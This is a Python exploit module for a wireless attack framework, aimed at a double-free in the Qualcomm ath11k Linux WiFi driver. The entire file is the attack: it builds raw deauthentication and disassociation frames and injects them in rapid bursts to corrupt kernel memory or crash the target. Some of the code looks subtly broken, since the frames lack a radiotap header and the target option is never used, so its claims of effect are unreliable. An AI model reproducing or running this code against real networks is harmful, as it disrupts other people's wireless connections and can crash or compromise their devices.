# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Qualcomm ath11k Double-Free in Teardown Path (CVE-2026-63822).

    The ath11k driver in the Linux kernel (since 5.6) contains a
    double-free vulnerability in its interface teardown path.  When a
    wireless interface is being torn down while concurrent operations
    (scanning, association) are still in progress, the driver frees an
    internal structure that may have already been freed by a parallel
    cleanup handler.  An attacker within WiFi range can trigger this
    race condition by sending a sequence of management frames (deauth,
    disassoc) that forces repeated interface teardown and re-init,
    leading to kernel memory corruption and potential code execution.

    CVSS v3.1: ~7.0 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Qualcomm ath11k Double-Free in Teardown (CVE-2026-63822)",
        "description": (
            "Exploits CVE-2026-63822 via a double-free in the ath11k "
            "driver teardown path.  Rapid deauthentication and "
            "disassociation frames force the driver into a race condition "
            "where the teardown handler frees a structure already freed "
            "by the concurrent cleanup path, corrupting kernel heap."
        ),
        "authors": (
            "Linux kernel security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-63822",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-06-15",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel >= 5.6 with ath11k (Qualcomm WiFi 6/6E)",
            "Qualcomm QCN9074, IPQ8074, WCN6855 chipsets",
            "OpenWrt, ChromeOS with ath11k",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target = OptIP("", "Target station MAC or BSSID")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Timeout for frame injection")
    channel = OptInteger(36, "WiFi channel (5 GHz for ath11k)")
    deauth_rounds = OptInteger(128, "Number of deauth/disassoc burst rounds")
    burst_delay = OptFloat(0.001, "Delay between frames in a burst (seconds)")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_DEAUTH = 0x0C
    _SUBTYPE_DISASSOC = 0x0A
    _SUBTYPE_PROBE_REQ = 0x04

    _REASON_UNSPECIFIED = 1
    _REASON_PREV_AUTH_INVALID = 2
    _REASON_DEAUTH_LEAVING = 3

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_deauth_frame(self, src: bytes, dst: bytes, reason: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_DEAUTH)
        duration = struct.pack("<H", 0)
        bssid = src
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        body = struct.pack("<H", reason)
        return header + body

    def _build_disassoc_frame(self, src: bytes, dst: bytes, reason: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_DISASSOC)
        duration = struct.pack("<H", 0)
        bssid = src
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        body = struct.pack("<H", reason)
        return header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        src = b"\xaa\xbb\xcc\xdd\xee\xff"
        bssid = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        return header + ssid_ie + rates_ie

    def _inject_frame(self, sock: socket.socket, frame: bytes) -> bool:
        try:
            sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; triggering ath11k teardown race")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src_bssid = b"\x02\x00\x00\x00\x00\x01"
        dst_broadcast = b"\xff\xff\xff\xff\xff\xff"

        reasons = [
            self._REASON_UNSPECIFIED,
            self._REASON_PREV_AUTH_INVALID,
            self._REASON_DEAUTH_LEAVING,
        ]

        print_status(
            f"Injecting {self.deauth_rounds} deauth/disassoc burst rounds "
            f"on channel {self.channel}"
        )

        success = 0
        for rnd in range(self.deauth_rounds):
            src = bytearray(src_bssid)
            src[5] = rnd & 0xFF
            reason = reasons[rnd % len(reasons)]

            deauth = self._build_deauth_frame(bytes(src), dst_broadcast, reason)
            disassoc = self._build_disassoc_frame(bytes(src), dst_broadcast, reason)

            if self._inject_frame(raw, deauth):
                success += 1
            time.sleep(self.burst_delay)
            if self._inject_frame(raw, disassoc):
                success += 1
            time.sleep(self.burst_delay)

        raw.close()

        print_status(f"Injected {success} frames across {self.deauth_rounds} rounds")
        print_info(
            "If the target uses ath11k on a kernel >= 5.6, the rapid "
            "teardown/re-init cycle should trigger the double-free in the "
            "cleanup path. Monitor for kernel oops or panic."
        )
